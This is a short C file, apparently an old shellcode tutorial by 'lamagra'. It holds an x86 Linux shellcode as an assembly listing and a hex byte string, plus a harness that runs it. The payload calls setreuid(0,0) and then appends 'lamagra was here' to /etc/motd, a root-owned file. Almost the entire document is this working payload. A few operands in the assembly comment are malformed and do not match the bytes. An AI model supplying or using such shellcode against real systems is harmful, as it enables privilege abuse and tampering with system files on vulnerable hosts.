/*
        WRITING SHELLCODE by lamagra

        This code writes "lamagra was here" to /etc/motd after setreuid(0,0).

.text
.globl main
        .type    main,@function
_start:
        # setreuid (0, 0)
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        xorl %edx,%edx
        movb $70,%al
        int  $0x80

        jmp 0x20
        popl %esi
        leal (%esi), %ebx
	movb %edx,0x9(%esi)

        # open("/etc/motd", O_RDWR|O_NONBLOCK|O_APPEND)
        movb $5, %al
        movw $0xc02, %cx
        int  $0x80

	leal 0xa(%ebx), %ecx
        movl %eax, %ebx

        # write(%ebx, <text>, <size>)
        movb $4, %al
        movb $17, %dx
        int  $0x80

        # exit(0)
        xorl %eax, %eax
        xorl %ebx, %ebx
	inc  %eax
        int $0x80
        call -0x25
	.string "/etc/motd8lamagra was here\n"
*/

char code[]=
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\xcd\x80\xeb\x20\x5e\x8d"
"\x1e\x88\x56\x09\xb0\x05\x66\xb9\x02\x0c\xcd\x80\x8d\x4b\x0a\x89"
"\xc3\xb0\x04\xb2\x11\xcd\x80\x31\xc0\x31\xdb\x40\xcd\x80\xe8\xdb"
"\xff\xff\xff/etc/motd8lamagra was here\n";

#define NAME "writing shellcode by lamagra"
main()
{
  int (*funct)();
  funct = (int (*)()) code;
  printf("%s\n\tSize = %d\n",NAME,strlen(code));
  (int)(*funct)();
}
